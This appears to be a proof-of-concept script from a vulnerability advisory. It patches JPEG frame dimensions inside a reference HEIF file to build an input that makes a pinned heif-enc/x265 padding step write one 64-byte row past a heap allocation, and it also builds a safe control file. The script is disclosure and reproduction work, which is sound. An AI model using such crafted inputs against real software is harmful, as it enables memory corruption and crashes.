#!/usr/bin/env python3
"""W181: derive a single-file MJPEG sequence with the advisory's allocation size.

The committed reference is two 512x64 grayscale JPEG samples encoded by the
pinned v1.23.6 `heif-enc -S --jpeg`. Only the SOF0 dimensions are patched;
the entropy-coded bytes are untouched. The first frame declares 512x72, so
the x265 encoder takes its coded size from that file frame (no harness-created
sizing frame); the second declares 64x512. The vulnerable padding call then
allocates 512*72 + 15 = 36879 bytes and writes one 64-byte row past it.

The safe control patches both frames to 512x72. JPEG's entropy stream still
holds only 64 rows, so libjpeg reports "premature end of data segment" in both
inputs; the decoder still returns the SOF-declared dimensions (observed in the
saved logs).

Usage: make_advisory_size_sequence.py OUTPUT_DIR
"""
import hashlib
import struct
import sys
from pathlib import Path

REF = Path(__file__).resolve().parents[1] / "evidence" / "reference-same-size.heif"
REF_SHA = "4da16469703ce5cbc48f7a64f430fb7b1898279df3fcbbca0aa02a5cf583f8dc"
SAMPLE_SIZE = 1138
EXPECTED = {
    "advisory.heif": "d749c1bd05264319a26449eeb73bccd771c0eb327524f27c658ac679f4ce79fe",
    "safe72.heif": "fe3b4d4da5ef0a762a78263dc03fbb7da8e77e2b40bb8abd6917ffa38e029419",
}


def patch(data: bytearray, sizes):
    boxes = []
    off = 0
    while off + 8 <= len(data):
        size, kind = struct.unpack_from(">I4s", data, off)
        if size < 8 or off + size > len(data):
            raise SystemExit(f"bad box at {off}: {size} {kind!r}")
        boxes.append((off, size, kind))
        off += size
    mdats = [(o, n) for o, n, k in boxes if k == b"mdat"]
    mdat_start, mdat_size = mdats[-1]
    payload = mdat_start + 8
    if mdat_size - 8 != 2 * SAMPLE_SIZE:
        raise SystemExit(f"unexpected mdat payload size {mdat_size - 8}")
    out = bytearray(data)
    for index, (height, width) in enumerate(sizes):
        lo = payload + index * SAMPLE_SIZE
        hi = lo + SAMPLE_SIZE
        sof = out.find(b"\xff\xc0", lo, hi)
        if sof < 0:
            raise SystemExit(f"no SOF0 in sample {index}")
        old_h, old_w = struct.unpack_from(">HH", out, sof + 5)
        if (old_w, old_h) != (512, 64):
            raise SystemExit(f"unexpected sample {index} size {old_w}x{old_h}")
        struct.pack_into(">HH", out, sof + 5, height, width)  # SOF order: H,W
    return out


def main():
    if len(sys.argv) != 2:
        raise SystemExit("usage: make_advisory_size_sequence.py OUTPUT_DIR")
    out_dir = Path(sys.argv[1])
    out_dir.mkdir(parents=True, exist_ok=True)
    data = REF.read_bytes()
    if hashlib.sha256(data).hexdigest() != REF_SHA:
        raise SystemExit("reference input changed")
    for name, sizes in (("advisory.heif", ((72, 512), (512, 64))),
                        ("safe72.heif", ((72, 512), (72, 512)))):
        out = patch(bytearray(data), sizes)
        digest = hashlib.sha256(out).hexdigest()
        if digest != EXPECTED[name]:
            raise SystemExit(f"{name}: unexpected sha256 {digest}")
        (out_dir / name).write_bytes(out)
        print(f"{name} sha256={digest} bytes={len(out)}")


if __name__ == "__main__":
    main()
